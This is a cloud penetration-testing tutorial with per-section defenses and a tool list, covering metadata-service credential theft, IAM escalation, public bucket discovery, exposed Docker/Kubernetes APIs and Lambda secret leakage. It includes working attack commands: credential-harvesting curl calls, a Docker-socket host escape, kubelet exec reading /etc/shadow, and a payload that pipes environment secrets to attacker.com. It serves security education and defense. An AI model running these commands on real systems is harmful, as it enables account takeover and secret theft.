Vuln · Cloud-Native

☁ Cloud-Native Pentesting

Modern applications no longer run on a single web server with a database behind it — they run on EC2 or GKE nodes that mount IAM roles, in containers that share kernels with their neighbors, behind serverless dispatchers that hand each request to a fresh-ish Lambda. Each new abstraction adds a control plane, and each control plane has its own authentication model, its own metadata service, and its own footguns. This page covers the seven attack patterns you should test for once a target's infrastructure crosses the cloud-native line: instance metadata abuse, IAM privilege escalation, public bucket discovery, exposed container/Kubernetes APIs, and serverless secret leakage. None of them require a 0-day — they all live in the gap between "what the cloud provider offers by default" and "what the customer remembered to lock down."

⚠ Scope & ethics

Cloud accounts are blast-radius weapons. A harvested set of credentials from one IMDS hit can list every S3 bucket, every Secret in Secrets Manager, and every running EC2 in the account — well past the scope you were authorized for. Confirm in writing that the cloud account is in scope before exercising any of these techniques against a real target, and stop at proof-of-credential rather than escalating further. For practice, use intentionally vulnerable environments like CloudGoat, flaws.cloud, or kube-goat — they are explicitly designed for these techniques and won't bill the wrong AWS account when something goes sideways. Don't run privilege-escalation enumerators (Pacu, Prowler with --allow-pii) against a live customer tenant without the customer's security team aware and ready to suppress alarms.

1🛰 IMDS abuse beyond SSRF

Cloud instance metadata services (IMDS) on the link-local IP 169.254.169.254 issue temporary credentials for the attached IAM role. If you have any SSRF or server-side fetch primitive, you can mint AWS/GCP/Azure credentials that pivot you across the entire account. The metadata endpoint exists for legitimate reasons — workloads need a way to authenticate to other cloud services without storing long-lived secrets on disk — but the same endpoint is reachable from any process on the host, and worse, from any application that the attacker can convince to issue an HTTP request on the host's behalf.

The classic primitive is SSRF: a vulnerable image-fetcher, a webhook URL field, a PDF-rendering service, a "fetch URL preview" feature. Any of these handed an attacker-controlled URL becomes a one-shot credential exfiltrator. AWS responded with IMDSv2, which requires a session token obtained via PUT — most off-the-shelf SSRF primitives only do GET, so requiring IMDSv2 broke a large fraction of historical exploits. But IMDSv1 is still on by default for instances that pre-date the rollout, and many production accounts have never enforced the upgrade.

# AWS IMDSv1 — single GET request, no auth
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns the role name, e.g. "ec2-app-role"
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ec2-app-role
# Returns: AccessKeyId, SecretAccessKey, Token, Expiration

# AWS IMDSv2 — token-required (PUT to /api/token first)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

Each cloud provider runs its own metadata service with the same shape but different headers. GCP requires the Metadata-Flavor: Google header, which most naive SSRF primitives can't add but which Capture-the-Flag-grade SSRF (a request-smuggling chain, a header-injection sink, an HTTP-library quirk that allows arbitrary headers) usually can. Azure requires Metadata: true on a slightly different URL path. Knowing the right shape for each provider is half the battle.

# GCP equivalent
curl http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token \
  -H "Metadata-Flavor: Google"

# Azure equivalent
curl 'http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/' \
  -H "Metadata: true"

Once you have the credentials, the next step isn't "exfiltrate via the original SSRF" — it's "use them like any other AWS credentials." Set the three magic environment variables and the AWS CLI will pick them up automatically. sts get-caller-identity tells you who you are; iam get-user and friends tell you what you can do; s3 ls is usually the fastest way to demonstrate impact in a report.

# Use harvested AWS creds via SSRF
export AWS_ACCESS_KEY_ID=ASIA...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...
aws sts get-caller-identity
aws s3 ls
aws iam get-user

Defenses: enforce IMDSv2 on every EC2 instance (HttpTokens=required on the instance metadata options, set at launch or via aws ec2 modify-instance-metadata-options). Set the hop limit to 1 so containers running on the host can't reach IMDS through the host's network namespace. Block 169.254.169.254 at the egress proxy / SSRF allowlist for any service that fetches user-supplied URLs. In Kubernetes, attach a NetworkPolicy that denies pod egress to the link-local range, and use IRSA / Workload Identity so pods get their own scoped credentials instead of inheriting the node's.

2🔓 IAM privilege escalation

Even a "low-privilege" IAM role can pivot to admin if it has the wrong combination of permissions. Rhino Security Labs documented 21 known escalation paths in their canonical 2018 paper, and the catalog has only grown since. The pattern is always the same: you can't directly grant yourself *:*, but you can do something adjacent — create a Lambda function that runs as a more privileged role, edit a role's trust policy to make yourself a trusted principal, attach a managed policy to your own user — and the indirect path lands you at admin in one or two hops.

The single most reliable escalation is iam:CreateAccessKey on any user with stronger permissions than yours. It doesn't require any social engineering or chaining — you simply mint a new long-lived key against a more privileged user and use it as your own. Its cousins, iam:PassRole + lambda:CreateFunction (or ec2:RunInstances, ecs:RegisterTaskDefinition, glue:CreateJob, etc.), are the indirect form: you don't have admin yourself, but you can ask a compute service to run code as a role that does. iam:UpdateAssumeRolePolicy is the most surgical: rewrite the trust document on an admin role so that you become a trusted principal, then sts assume-role into it.

# Self-elevate via iam:CreateAccessKey
aws iam create-access-key --user-name <attached-user>
# Now you have permanent (non-rotating) credentials

# iam:PassRole + lambda:CreateFunction — execute as a more-privileged role
aws iam list-roles --query 'Roles[?AssumeRolePolicyDocument]'
aws lambda create-function --function-name pwn \
  --runtime python3.11 --role <admin-role-arn> \
  --handler lambda_function.lambda_handler \
  --zip-file fileb://payload.zip
aws lambda invoke --function-name pwn output.json

# iam:UpdateAssumeRolePolicy — make yourself a trusted principal
aws iam update-assume-role-policy --role-name admin \
  --policy-document file://trust-attacker.json

You don't have to enumerate by hand. Pacu — Rhino's open-source AWS exploitation framework — ships modules that map the current credentials' permissions and then check each known escalation path against them. The output is a ranked list of "you can probably escalate via X" candidates with the exact next command to run. Treat its output as hypotheses, not verdicts: a couple of paths require non-default conditions (a particular service principal, a specific resource policy) that the enumerator can't always check.

# Enumerate paths with Pacu
pacu --session pen
import iam__enum_permissions
iam__privesc_scan

Defenses: attach a permission boundary to every IAM role that limits the maximum effective permissions, even if a policy is later attached that would otherwise grant more. Review every trust policy quarterly — the trust document is the single point of failure for cross-account compromise. Run AWS IAM Access Analyzer in CI to catch risky policies before they ship. Wire CloudTrail alarms on the exact API calls attackers use: CreateAccessKey, UpdateAssumeRolePolicy, AttachUserPolicy, PutUserPolicy, CreateFunction with a non-default role. None of these calls are part of normal application traffic, so the false-positive rate is low and the signal is high.

3🪣 Public S3 / GCS / Azure blob discovery

Most cloud-data leaks come from misconfigured buckets — public READ on what should be private. The bucket name is global across the entire cloud provider's namespace, so brute-forcing candidate names against AWS's S3 endpoint or GCP's storage endpoint is cheap, fast, and unauthenticated. The combination of "predictable naming conventions" + "default permissions are private but humans flip them" + "no rate limit on bucket-existence checks" makes this the highest-yield recon pattern in cloud testing.

The recon flow is permutation-based: take the target's company name and every product brand they ship, then mash them against common suffixes (-prod, -staging, -backups, -logs, -uploads, -public, -internal, -dev, -tmp) and prefixes (the company's ticker symbol, the year). Tools like cloud_enum and s3recon automate the wordlist permutation and the parallel HEAD requests to check existence and listability across all three hyperscalers in one run.

# Bucket name brute-force (cloud_enum, s3recon)
cloud_enum -k acme -k acme-corp -k acmeprod
s3recon acme-domains.txt

# Test a candidate bucket — works without creds if public
aws s3 ls s3://acme-prod-backups --no-sign-request
aws s3 cp s3://acme-prod-backups/db.sql.gz . --no-sign-request

# Find buckets via Google dorking too
# site:s3.amazonaws.com "acme.com"
# site:storage.googleapis.com "acme.com"

Once you confirm a public bucket, the next question is "what's in it that the company would not want public?" The instinct is to recursive-list and grep for keywords, but big buckets routinely have millions of objects — a smarter first pass filters by size. Backups, database dumps, customer data exports, and CI artifacts are usually larger than a few megabytes, while a public-asset bucket holding logos and CSS is full of tiny files. Sort by descending size and read the top 50 keys; that's where the high-impact findings hide.

# Once inside, look for: configs with creds, customer data, CI artifacts
aws s3api list-objects --bucket acme-prod-backups --no-sign-request \
  --query 'Contents[?Size>`100000000`].{Key:Key,Size:Size}'

Defenses: enable the account-level S3 Public Access Block on every AWS account (4 toggles, all on, no exceptions for production). Add the bucket-level public-access block too — defense-in-depth in case the account-level toggle is later relaxed. Run AWS Config rule s3-bucket-public-read-prohibited with auto-remediation that flips public buckets back to private. Mirror the same controls on GCS (uniform bucket-level access + public-access prevention enforced at the org policy level) and Azure (storage-account "allow public blob access = false"). Audit access logs for unauthenticated reads — a public bucket that nobody is reading from is also a public bucket nobody will miss when you make it private.

4🐳 Container / K8s exposed APIs

Containers and Kubernetes introduce new exposed control planes, each one a one-shot RCE if it lands. The Docker socket is root-equivalent on the host: any process that can write to /var/run/docker.sock can launch a container that mounts the host filesystem at / and chroot into it. The Kubernetes API on port :6443 with anonymous-auth turned on is full cluster takeover. The kubelet on :10250 exposes a read API that, in older clusters, is unauthenticated and lets you exec into any pod on the node. Etcd on :2379 contains the entire cluster state including every Secret in plaintext.

The Docker-socket-in-a-container case is the most common exploitable variant during application pentests. CI runners, GitLab DinD jobs, "innovative" cloud IDEs, and a wide variety of agentic-AI sandboxes all bind-mount the host's Docker socket into a worker container so the worker can build images. Anyone who lands code execution inside that worker — XSS-to-CI-job, malicious dependency in a build, a webshell on a CI box — gets root on the host through one Docker run.

# Docker socket exposure (in a container with /var/run/docker.sock mounted)
docker -H unix:///var/run/docker.sock run -v /:/host alpine chroot /host

# K8s API exposed on :6443 with anonymous-auth=true
curl -k https://target.com:6443/api/v1/namespaces/kube-system/secrets

# kubelet read API on :10250 (commonly unauthenticated pre-1.23)
curl -k https://target.com:10250/pods
curl -k https://target.com:10250/runningpods/

# Exec into a running pod via kubelet
curl -k --cert /tmp/cert.pem --key /tmp/key.pem \
  -X POST "https://target.com:10250/run/<namespace>/<pod>/<container>" \
  -d "cmd=cat /etc/shadow"

Etcd exposure is the rarest of these but the most destructive. Etcd is the source of truth for the entire cluster — Pods, Secrets, ConfigMaps, ServiceAccounts, RBAC bindings, every network policy. A read on / with the --prefix flag dumps everything, including every plaintext Secret in every namespace. (Yes, by default Kubernetes Secrets are base64-encoded, not encrypted at rest, unless KMS encryption is explicitly configured.)

# Exposed etcd (port 2379) — full K8s state including all secrets
ETCDCTL_API=3 etcdctl --endpoints=http://target.com:2379 get / --prefix

For external recon against a Kubernetes target, kube-hunter is the canonical tool. It scans for the half-dozen control-plane ports, fingerprints each, and reports both passive findings (which control-plane endpoints are exposed) and active findings (which ones it could exploit unauthenticated). Pair its output with kube-bench on any node you can read on-box — kube-bench is the CIS-benchmark checker, and a fresh report from it usually identifies the same anonymous-auth, unauthenticated kubelet, and missing-NetworkPolicy issues that kube-hunter sees from outside.

# K8s recon tool — kube-hunter
kube-hunter --remote target.com

Defenses: never expose the Docker socket without read-only constraints; prefer rootless Docker or Buildah/Kaniko for in-cluster builds. Disable anonymous auth on the K8s API (it's --anonymous-auth=false; default is correct on 1.6+ but check your distro's overrides). Lock down kubelet with --anonymous-auth=false and --authorization-mode=Webhook. Run etcd over TLS only and restrict access to control-plane nodes. Apply NetworkPolicies in every namespace — the default in Kubernetes is "all pods can reach all other pods on every port," which is wrong for any production-shaped trust model. Adopt the Pod Security Standards (Restricted profile) via Pod Security admission to block privileged containers, host-path mounts, and host-network pods by default.

5λ Lambda / Cloud Functions secret leakage

Serverless function env-vars routinely contain credentials — database passwords, third-party API keys, encryption keys for the function's own KMS-wrapped secrets. The convenience of process.env.DB_PASSWORD is the entire developer-experience pitch; the cost is that any RCE in the handler hands the attacker every secret the function knows. Worse, /tmp is shared across warm invocations on the same container — secrets dropped there persist for any later request that hits the same warm instance, even if those later requests come from a different user, a different tenant, or a different attacker entirely.

The exploitation path mirrors traditional web RCE: find a sink that lets you execute code in the function's process — a Log4Shell-shaped JNDI lookup, a deserialization gadget in the request handler, a server-side template injection in a generated report — then dump os.environ / process.env / Object.entries(process.env) back over the network. The "network" part doesn't even need to be the request response; Lambdas can usually make outbound HTTP, so a beacon to an attacker-controlled URL works fine.

# Trigger Lambda + dump env (typical sink: log4shell, RCE in handler)
aws lambda invoke --function-name billing \
  --payload '{"q":"$(env | curl -X POST -d@- attacker.com)"}'  \
  /tmp/out.json

# /tmp persistence across invocations
# Invocation 1 (logs creds for later harvest):
echo "AWS_KEY=$AWS_ACCESS_KEY_ID" >> /tmp/x
# Invocation 2 (later, same warm container):
cat /tmp/x  # creds from earlier invocation are still there

# Lambda Layer abuse — attacker publishes a layer your function uses
aws lambda publish-layer-version --layer-name common-utils \
  --content S3Bucket=attacker-bucket,S3Key=evil.zip

Once you have any one Lambda's role credentials, the natural pivot is "list every Lambda in the account and dump its environment variables." This isn't an exploit on those other Lambdas — you're just reading the function configuration as the role allows — but it's the fastest way to find the high-value secrets in the account. A typical mid-sized AWS account has a hundred Lambda functions, and four or five of them will have an API_KEY or STRIPE_SECRET sitting in plaintext env-vars.

# Dump all Lambda env vars across the account (post-compromise)
for fn in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do
  aws lambda get-function-configuration --function-name "$fn" \
    --query 'Environment.Variables'
done

Defenses: store secrets in AWS Secrets Manager (with rotation) or Parameter Store SecureString instead of plaintext env-vars; have the function fetch them at cold start with a short TTL cache. Refresh secrets per-invocation for the highest-value credentials, accepting the small latency cost. Minimize /tmp reliance and explicitly clear it on handler entry if you must use it for caching. Enable Lambda Code Signing so only signed deployments can run, and require signing for any layer your functions consume — Lambda layer abuse is an underrated supply-chain vector when an attacker can publish a new version of a layer that downstream functions reference by major version. Use VPC-attached Lambdas with egress restricted to a known allowlist so a compromised function can't beacon home freely.

6🧰 Detection / mitigation tools

Cloud-native posture is a stack of small tools, each catching a different layer. None individually is a silver bullet; together they catch most of the realistic threat model. The list below is the set worth knowing by name during an engagement — they all have free tiers and integrate into CI in well-documented ways.

  • Prowler — multi-cloud security scanner; runs hundreds of CIS / NIST / SOC2-mapped checks against AWS, Azure, GCP, and Kubernetes in one binary. github.com/prowler-cloud/prowler
  • ScoutSuite — multi-cloud auditing tool from NCC Group; produces a single browseable HTML report per account. The complement to Prowler — Prowler gives you a checklist, ScoutSuite gives you an explorable map. github.com/nccgroup/ScoutSuite
  • Pacu — AWS exploitation framework from Rhino Security Labs; the offensive counterpart to Prowler. Modules for IAM privesc, persistence, lateral movement, exfil. github.com/RhinoSecurityLabs/pacu
  • CloudGoat — vulnerable AWS environment for practice; deploys intentionally-misconfigured scenarios (privesc paths, exposed buckets, IMDS-to-S3 chains) you can attack without bumping into a real customer's bill. github.com/RhinoSecurityLabs/cloudgoat
  • kube-hunter / kube-bench — K8s security testing. kube-hunter is the active scanner (probes from outside or in-cluster), kube-bench runs the CIS Kubernetes Benchmark checklist on a node.
  • Steampipe — SQL queries over cloud-resource state for ad-hoc audits. Lets you write SELECT * FROM aws_s3_bucket WHERE bucket_policy_is_public and get an instant answer. steampipe.io
  • Hacking the Cloud — best community reference for offensive cloud techniques; an HTB-style playbook organized by cloud / service / technique. hackingthe.cloud
  • AWS IAM Access Analyzer + CloudTrail + GuardDuty — native AWS detection. Access Analyzer spots over-permissive policies, CloudTrail logs every API call, GuardDuty correlates them into known-bad patterns (instance credentials used from outside the account, Tor-egress, port-scanning).
  • gVisor / Kata Containers — runtime isolation for hostile workloads. gVisor intercepts syscalls in userspace; Kata wraps each container in a lightweight VM. Either turns a container escape from "RCE on host" into "RCE in a sandbox."
  • Falco — runtime threat detection in K8s. Watches syscalls and emits alerts when a pod does something suspicious (shell spawn in a container, write to /etc, unexpected outbound connection). Pairs naturally with the rest of this list.

  • Hacking the Cloud — community-maintained encyclopedia of offensive cloud techniques across AWS, GCP, Azure, and Kubernetes. The single best starting point for cloud pentesting playbooks.
  • Rhino Security Labs — AWS IAM privesc paths — the canonical 21-paths paper. Every escalation chain in Pacu's privesc module traces back to here.
  • OWASP Kubernetes Security Cheatsheet — defender-side checklist; pairs well with the offensive techniques in this page.
  • CIS AWS / Azure / GCP Foundations benchmarks — the universally-cited compliance baseline. Most enterprise cloud-security programs are scored against these. Worth reading the AWS one cover-to-cover at least once.
  • MITRE ATT&CK Cloud Matrix — cloud-specific tactics and techniques in the ATT&CK framework; the right vocabulary for mapping your engagement findings into an industry-standard taxonomy.
